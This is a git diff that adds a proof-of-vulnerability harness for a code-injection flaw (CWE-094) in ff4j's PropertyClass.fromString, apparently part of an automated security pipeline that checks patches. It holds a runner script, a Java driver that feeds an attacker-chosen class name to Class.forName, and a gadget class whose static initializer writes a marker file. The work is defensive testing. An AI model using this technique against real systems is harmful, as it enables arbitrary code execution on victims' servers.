@@ -1,0 +1,130 @@
+diff --git a/.security-pipeline/pov/out/PovMain.class b/.security-pipeline/pov/out/PovMain.class
+new file mode 100644
+index 0000000..dcf249f
+Binary files /dev/null and b/.security-pipeline/pov/out/PovMain.class differ
+diff --git a/.security-pipeline/pov/out/povgadget/PovGadget.class b/.security-pipeline/pov/out/povgadget/PovGadget.class
+new file mode 100644
+index 0000000..9505bf7
+Binary files /dev/null and b/.security-pipeline/pov/out/povgadget/PovGadget.class differ
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100644
+index 0000000..441d036
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,31 @@
++#!/usr/bin/env bash
++# POV for CWE-094 in ff4j PropertyClass.fromString (Class.forName RCE).
++# Runs inside the project container at /workspace/repo.
++# Exit 0 = vulnerable reproduced; non-zero = blocked (patched).
++set -eu
++
++POV_DIR="$(cd "$(dirname "$0")" && pwd)"
++REPO="/workspace/repo"
++MARKER="$(mktemp -u /tmp/ff4j_pov_marker.XXXXXX)"
++
++# 1. Compile the vulnerable module so we exercise the real product bytecode.
++cd "$REPO"
++mvn -q -B -pl ff4j-core -am -DskipTests compile 1>&2
++
++CP="$REPO/ff4j-core/target/classes"
++
++# 2. Compile the POV gadget + driver against the real PropertyClass.
++OUT="$POV_DIR/out"
++rm -rf "$OUT"
++mkdir -p "$OUT"
++javac -cp "$CP" -d "$OUT" \
++    "$POV_DIR/src/povgadget/PovGadget.java" \
++    "$POV_DIR/src/PovMain.java" 1>&2
++
++# 3. Run the driver: it feeds an attacker-controlled class name into
++#    PropertyClass.fromString(). The gadget lives on the classpath.
++rc=0
++java -Dff4j.pov.marker="$MARKER" -cp "$CP:$OUT" PovMain || rc=$?
++
++rm -f "$MARKER" 2>/dev/null || true
++exit $rc
+diff --git a/.security-pipeline/pov/src/PovMain.java b/.security-pipeline/pov/src/PovMain.java
+new file mode 100644
+index 0000000..474a41f
+--- /dev/null
++++ b/.security-pipeline/pov/src/PovMain.java
+@@ -0,0 +1,44 @@
++import org.ff4j.property.PropertyClass;
++
++import java.io.File;
++
++/**
++ * Proof of Vulnerability for CWE-094 in ff4j PropertyClass.
++ *
++ * PropertyClass.fromString(String v) calls Class.forName(v). The single-arg
++ * Class.forName initializes the named class, running its static initializer.
++ * By passing an attacker-controlled class name we cause arbitrary code
++ * (the gadget's static block) to execute -> remote code injection.
++ *
++ * Exit 0  => vulnerable  (gadget code executed, marker file written)
++ * Exit 1  => not vulnerable (fromString did not load/initialize the class)
++ */
++public class PovMain {
++
++    public static void main(String[] args) {
++        File marker = new File(System.getProperty("ff4j.pov.marker"));
++        if (marker.exists()) {
++            marker.delete();
++        }
++
++        // Attacker-controlled input flowing into PropertyClass.fromString().
++        String attackerControlledClassName = "povgadget.PovGadget";
++
++        try {
++            new PropertyClass().fromString(attackerControlledClassName);
++        } catch (Throwable t) {
++            // A hardened/patched fromString should refuse to load arbitrary
++            // classes (throwing or returning null without initialization).
++            System.out.println("fromString raised: " + t);
++        }
++
++        if (marker.exists()) {
++            System.out.println("VULNERABLE: attacker-controlled class was loaded "
++                    + "and its static initializer executed via Class.forName.");
++            System.exit(0);
++        }
++
++        System.out.println("NOT VULNERABLE: no attacker code executed.");
++        System.exit(1);
++    }
++}
+diff --git a/.security-pipeline/pov/src/povgadget/PovGadget.java b/.security-pipeline/pov/src/povgadget/PovGadget.java
+new file mode 100644
+index 0000000..e0fd6a1
+--- /dev/null
++++ b/.security-pipeline/pov/src/povgadget/PovGadget.java
+@@ -0,0 +1,29 @@
++package povgadget;
++
++import java.io.File;
++import java.io.FileOutputStream;
++
++/**
++ * Malicious "gadget" class. Its static initializer runs arbitrary code the
++ * moment the class is loaded and initialized (which is exactly what
++ * {@code Class.forName(String)} does).
++ *
++ * In a real attack this role is played by any class already on the victim's
++ * classpath whose static initialization has dangerous side effects. Here we
++ * simply drop a marker file to *prove* attacker-controlled code executed.
++ */
++public class PovGadget {
++
++    static {
++        try {
++            String marker = System.getProperty("ff4j.pov.marker");
++            if (marker != null) {
++                FileOutputStream fos = new FileOutputStream(new File(marker));
++                fos.write("pwned-by-Class.forName".getBytes("UTF-8"));
++                fos.close();
++            }
++        } catch (Exception e) {
++            // ignore - marker absence will signal "not executed"
++        }
++    }
++}
